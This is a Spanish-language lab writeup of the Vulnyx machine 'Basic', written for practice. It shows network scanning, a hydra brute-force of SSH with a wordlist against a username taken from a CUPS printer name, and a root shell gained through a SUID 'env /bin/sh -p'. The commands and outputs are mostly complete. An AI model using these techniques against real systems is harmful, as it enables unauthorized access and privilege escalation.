---
date: 2023-11-03 12:00:00
layout: post
title: Basic Writeup
subtitle: Writeup de la máquina Basic de la plataforma Vulnyx
description: En esta máquina debido a información al descubierto obtuvimos un nombre de usuario con el cual pudimos obtener una sesión en el servicio ssh a través de un ataque de fuerza bruta.
image: /assets/img/machines/Basic/Basic.png
optimized_image: /assets/img/machines/Basic/Basic.png
category: Writeup
tags:
  - Vulnyx
  - Writeup
  - Linux
  - Information Disclosure
  - Easy
  - Bruteforce
  - SUID permissions 
author: FredBrave
---
# Enumeración
Empezaremos encontrando la ip de la máquina víctima en nuestro segmento de red local con la herramienta arp-scan.

```bash
sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:53:0c:ba, IPv4: 10.0.2.133
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)
10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)
10.0.2.3        08:00:27:8e:f9:8a       (Unknown)
10.0.2.158      08:00:27:a6:37:53       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.851 seconds (138.30 hosts/sec). 4 responded
```
Una vez encontrada la ip procedemos con dos escaneos de nmap uno rápido para encontrar los puertos abiertos y otro más exhaustivo el cual encontrara versiones y probara distintos scripts en estos puertos para encontrar vulnerabilidades.

```bash
❯ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.0.2.158 -oG Targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 12:07 EDT
Nmap scan report for 10.0.2.158
Host is up (0.0012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
631/tcp open  ipp
MAC Address: 08:00:27:A6:37:53 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.36 seconds

❯ sudo nmap -p22,80,631 -sCV 10.0.2.158 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 12:07 EDT
Nmap scan report for 10.0.2.158
Host is up (0.00078s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Test Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
631/tcp open  ipp     CUPS 2.3
|_http-title: Inicio - CUPS 2.3.3op2
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.3 IPP/2.1
MAC Address: 08:00:27:A6:37:53 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
```
# Shell como dimitri

Encontramos los puertos 22,80 y 631 abiertos de entre estos puertos el más interesante sería el 631 el cual contiene un software llamado CUPS.

Investigando encuentro que CUPS (Common Unix Printing System) es un interface web que hace amigable el administrar dispositivos como impresoras. Sabiendo esto entramos a este puerto a través del navegador para enumerar información que pueda encontrar.

<img class="img" src="/assets/img/machines/Basic/1.png" width="1200">

Buscando en la interfaz encuentro que hay una impresora registrada la cual tiene por nombre dimitri\_printer.

<img class="img" src="/assets/img/machines/Basic/2.png" width="1300">

Después de esto no encuentro mucho más, pero sabiendo el nombre de la impresora puedo suponer que existe un posible nombre de usuario "dimitri", con el puerto 22 del servicio ssh abierto intento un ataque de fuerza bruta con la herramienta hydra.

```bash
❯ hydra ssh://10.0.2.158 -l dimitri -P /usr/share/wordlists/rockyou.txt -t 60 -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-03 11:47:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking ssh://10.0.2.158:22/
[STATUS] 312.00 tries/min, 312 tries in 00:01h, 14344113 to do in 766:15h, 34 active
[22][ssh] host: 10.0.2.158   login: dimitri   password: m****e
[STATUS] attack finished for 10.0.2.158 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-03 11:49:58
```
Ingresamos por ssh como dimitri.

```bash
❯ ssh dimitri@10.0.2.158
dimitri@10.0.2.158's password: 
dimitri@basic:~$ whoami
dimitri
```

# Shell como root

Enumerando encuentro que el binario "env" tiene permisos SUID.

```bash
dimitri@basic:~$ find / -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 48480 sep 24  2020 /usr/bin/env
-rwsr-xr-x 1 root root 55528 ene 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 71912 ene 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 58416 feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 88304 feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52880 feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 35040 ene 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 63960 feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 44632 feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 481608 sep 24 00:13 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 jun  6 16:07 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 19040 ene 13  2022 /usr/libexec/polkit-agent-helper-1
```
Sabiendo esto nos aprovechamos del binario env ejecutando una shell como root.

```bash
dimitri@basic:~$ env /bin/sh -p
# whoami
root
```
Hemos pwneado la maquina!!!

